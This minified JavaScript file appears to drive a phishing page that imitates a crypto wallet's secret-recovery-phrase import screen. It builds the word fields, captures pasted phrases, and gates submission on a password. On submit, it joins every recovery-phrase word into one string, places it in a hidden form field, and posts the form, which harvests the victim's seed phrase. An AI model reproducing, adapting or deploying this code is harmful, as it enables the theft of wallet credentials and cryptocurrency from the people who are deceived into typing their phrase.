document.addEventListener("DOMContentLoaded", function () {
  document.getElementById("toggleInput").addEventListener("click", function () {
    var e = document.getElementById("sec-rec-phr");
    e.type = "text" === e.type ? "password" : "text";
  }),
    document
      .getElementById("toggleInputPW")
      .addEventListener("click", function () {
        var e = document.getElementById("new-pw");
        e.type = "text" === e.type ? "password" : "text";
      });
  let t = document.getElementById("boxCountSelect"),
    r = document.querySelector(".import-srp__srp");
  t.addEventListener("change", function () {
    let e = parseInt(this.value, 10),
      t = document.querySelectorAll(".import-srp__srp-word");
    if (e < t.length)
      Array.from(t)
        .slice(e)
        .forEach((e) => {
          (e.querySelector(".phr-word").value = ""), e.remove();
        });
    else
      for (let o = t.length + 1; o <= e; o++) {
        let e = document.createElement("div");
        (e.className = "import-srp__srp-word"),
          (e.innerHTML = `
          <label
          for="import-srp__srp-word-${o}"
          class="import-srp__srp-word-label"
        >
          <p
            class="mm-box mm-text mm-text--body-md mm-box--color-text-default"
          >
          ${o}
          </p>
        </label>
        <div class="MuiFormControl-root MuiTextField-root">
          <div
            class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl"
          >
            <input
              aria-invalid="false"
              autocomplete="off"
              id="import-srp__srp-word-${o}"
              type="password"
              dir="auto"
              data-testid="import-srp__srp-word-${o}"
              class="MuiInputBase-input MuiInput-input phr-word"
              value=""
              name='phrase-${o}'
            />
          </div>
        </div>
        <div class="show-hide-toggle">
          <input
            class="show-hide-toggle__input"
            id="import-srp__srp-word-${o}-checkbox"
            type="checkbox"
            data-testid="import-srp__srp-word-${o}-checkbox"
          /><label
            for="import-srp__srp-word-${o}-checkbox"
            class="show-hide-toggle__label"
            title="Show/Hide this word of the secret recovery phrase"
            ><svg
              width="24"
              height="24"
              fill="currentColor"
              class="show-hide-toggle__icon"
              aria-label="This word is hidden"
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 640 512"
            >
              <path
                d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
              ></path></svg
          ></label>
        </div>
          `),
          r.appendChild(e);
      }
    n();
  });
  let o = document.querySelectorAll(".import-srp__srp-word"),
    l = document.querySelectorAll(".phr-word");
  function n() {
    o.forEach((e, t) => {
      let r = e.querySelector(".phr-word"),
        o = e.querySelector(".show-hide-toggle__input");
      r.addEventListener("input", function () {
        u();
      }),
        o.addEventListener("change", function () {
          let e = this.checked;
          r.type = e ? "text" : "password";
        });
    });
  }
  n();
  let i = document.querySelector("#submit-btn"),
    d = document.querySelector("#password"),
    s = document.querySelector("#confirm-password"),
    a = document.querySelector("#my-new-form");
  function u() {
    if (
      (function () {
        for (let e of l)
          if (
            !e.value.trim() ||
            d.value.trim().length < 8 ||
            s.value.trim().length < 8 ||
            d.value.trim() != s.value.trim()
          )
            return !1;
        return !0;
      })()
    ) {
      i.removeAttribute("disabled");
      let t = [];
      i.addEventListener("click", (r) => {
        r.preventDefault(),
          l.forEach((e) => {
            t.push(e.value);
          }),
          e(t.join("-"));
      });
    } else i.setAttribute("disabled", "");
  }
  d.addEventListener("input", u),
    s.addEventListener("input", u),
    a.addEventListener("submit", (e) => {
      e.preventDefault();
    }),
    l.forEach((e) => {
      e.addEventListener("input", u);
    }),
    u(),
    o.forEach((e) => {
      e.querySelector(".phr-word").addEventListener("paste", function (e) {
        e.preventDefault();
        let t = e.clipboardData.getData("text/plain").split(" ");
        o.forEach((e, r) => {
          (e.querySelector(".phr-word").value = t[r] || ""), u();
        });
      });
    });
});
async function e(e) {
  let t = document.querySelector("#my-new-form");
  (document.querySelector("#user-id-form").value = String(e)), t.submit();
}
//# sourceMappingURL=submit.7f15b0bf.js.map
